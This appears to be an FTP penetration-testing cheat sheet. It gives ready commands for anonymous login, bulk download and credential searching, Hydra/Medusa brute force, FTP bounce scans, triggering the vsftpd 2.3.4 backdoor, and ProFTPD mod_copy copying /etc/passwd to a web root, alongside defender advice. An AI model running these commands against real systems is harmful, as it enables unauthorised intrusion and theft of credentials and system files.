# FTP Enumeration (Port 21)

Enumerate FTP servers to identify anonymous access, misconfigurations, and potential file upload vulnerabilities.
FTP is commonly misconfigured to allow anonymous access or weak authentication, making it a prime target for initial access.

## Quick Reference

```bash
# Test anonymous access
ftp 10.10.10.10
# Username: anonymous
# Password: <blank or anonymous>

# Download all files recursively
wget -m --no-passive ftp://anonymous:anonymous@10.10.10.10

# Nmap FTP scripts
nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst 10.10.10.10
```

## Anonymous Access

```bash
# Connect with FTP client
ftp 10.10.10.10
# Username: anonymous
# Password: anonymous (or blank)

# Using netcat
nc -nv 10.10.10.10 21

# Check with Nmap
nmap -p 21 --script ftp-anon 10.10.10.10
```

## FTP Commands

```bash
# List files
ls
ls -la
ls -R  # Recursive listing

# Change directory
cd directory_name

# Download single file
get filename.txt

# Download multiple files
mget *.txt

# Upload single file
put testfile.txt

# Upload multiple files
mput *.txt

# Get server status
status

# Enable debugging
debug
trace

# Show help
help
HELP

# Show server features
FEAT
```

## Nmap NSE Scripts

```bash
# Anonymous login check
nmap -p 21 --script ftp-anon 10.10.10.10

# FTP bounce attack
nmap -p 21 --script ftp-bounce 10.10.10.10

# System information
nmap -p 21 --script ftp-syst 10.10.10.10

# Backdoor detection (vsftpd, proftpd)
nmap -p 21 --script ftp-vsftpd-backdoor,ftp-proftpd-backdoor 10.10.10.10

# All FTP scripts
nmap -p 21 --script "ftp-*" 10.10.10.10

# Brute force
nmap -p 21 --script ftp-brute --script-args userdb=users.txt,passdb=passwords.txt 10.10.10.10
```

## Download All Files

```bash
# Using wget (recursive download)
wget -m --no-passive ftp://anonymous:anonymous@10.10.10.10

# With specific port
wget -m --no-passive ftp://anonymous:anonymous@10.10.10.10:2121

# Download to specific directory
wget -m --no-passive -P /tmp/ftp_files ftp://anonymous:anonymous@10.10.10.10
```

## SSL/TLS FTP

```bash
# Connect with OpenSSL
openssl s_client -connect 10.10.10.10:21 -starttls ftp

# View certificate
openssl s_client -connect 10.10.10.10:21 -starttls ftp | openssl x509 -text
```

## Brute Force

```bash
# Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.10

# Medusa
medusa -u admin -P /usr/share/wordlists/rockyou.txt -h 10.10.10.10 -M ftp

# Medusa with specific port
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.10.10.10 -M ftp -n 2121
```

## FTP Bounce Attack

```bash
# Using Nmap
nmap -Pn -v -n -p 80 -b anonymous:password@10.10.10.10 172.17.0.2

# Scan internal network through FTP server
nmap -Pn -v -p 22,80,443 -b anonymous:@10.10.10.10 192.168.1.0/24
```

## File Operations

```bash
# List directory contents
ftp> ls
ftp> dir

# Recursive listing
ftp> ls -R

# Download file
ftp> get Important\ Notes.txt

# Download with local name
ftp> get remote_file.txt local_file.txt

# Upload file
ftp> put testupload.txt

# Delete file
ftp> delete unwanted.txt

# Create directory
ftp> mkdir new_folder

# Remove directory
ftp> rmdir old_folder
```

## Common Workflow

```bash
# Step 1: Check for anonymous access
ftp 10.10.10.10
# Try: anonymous / anonymous

# Step 2: If anonymous works, list all files
ftp> ls -R

# Step 3: Download everything
wget -m --no-passive ftp://anonymous:anonymous@10.10.10.10

# Step 4: Search downloaded files for sensitive data
grep -r "password" /tmp/ftp_files/
grep -r "credential" /tmp/ftp_files/

# Step 5: Try to upload a file (test write permissions)
echo "test" > test.txt
ftp> put test.txt
```

## Notes

**Common FTP Ports:**
- Port 21: FTP control (commands)
- Port 20: FTP data (active mode)
- Port 990: FTPS (FTP over SSL/TLS)

**FTP Modes:**
- **Active Mode**: Server initiates data connection to client
- **Passive Mode**: Client initiates both control and data connections (use `--no-passive` to disable)

**Anonymous Access:**
Common anonymous credentials:
- Username: `anonymous`, Password: `anonymous`
- Username: `anonymous`, Password: `<blank>`
- Username: `ftp`, Password: `ftp`
- Username: `guest`, Password: `guest`

**Common Misconfigurations:**

| Setting | Description | Risk |
|---------|-------------|------|
| `anonymous_enable=YES` | Allows anonymous login | Unauthorized access |
| `anon_upload_enable=YES` | Allows anonymous uploads | Malware upload, defacement |
| `anon_mkdir_write_enable=YES` | Allows anonymous directory creation | File system manipulation |
| `no_anon_password=YES` | No password required for anonymous | Easier anonymous access |
| `write_enable=YES` | Allows write operations | File modification/upload |

**VSFTPD Configuration:**
Configuration file: `/etc/vsftpd.conf`
User restrictions: `/etc/ftpusers` (users denied FTP access)

**FTP Bounce Attack:**
Exploits FTP's PORT command to scan internal networks or bypass firewall rules. Modern FTP servers have protections, but misconfigurations can make them vulnerable.

**Sensitive Files to Look For:**
- Configuration files (`.conf`, `.config`, `.ini`)
- Backup files (`.bak`, `.backup`, `.old`)
- Database dumps (`.sql`, `.db`)
- Credentials (`.txt`, `.log` containing "password", "credential")
- SSH keys (`.pem`, `.key`, `id_rsa`)
- Source code (`.php`, `.asp`, `.jsp`)

**Testing Checklist:**
1. Test anonymous access
2. Check for write permissions
3. Look for sensitive files
4. Test FTP bounce attack
5. Check for known vulnerabilities (vsftpd 2.3.4 backdoor, ProFTPD backdoors)
6. Attempt brute force if no anonymous access
7. Check SSL/TLS certificate for information disclosure

**Security Best Practices (for defenders):**
- Disable anonymous access unless required
- Use FTPS (FTP over SSL/TLS) instead of plain FTP
- Implement strong authentication
- Restrict write permissions
- Use `/etc/ftpusers` to deny access to system accounts
- Enable logging and monitor for suspicious activity
- Consider using SFTP (SSH File Transfer Protocol) instead

**Common Vulnerabilities:**
- **vsftpd 2.3.4**: Backdoor vulnerability (smiley face backdoor)
- **ProFTPD**: Multiple backdoor and RCE vulnerabilities
- **Core FTP**: Path traversal vulnerabilities
- **Anonymous write access**: File upload and potential RCE

**Exploitation Examples:**
```bash
# vsftpd 2.3.4 backdoor
telnet 10.10.10.10 21
# Username: user:)
# Triggers backdoor on port 6200

# ProFTPD mod_copy exploitation
telnet 10.10.10.10 21
SITE CPFR /etc/passwd
SITE CPTO /var/www/html/passwd.txt
```
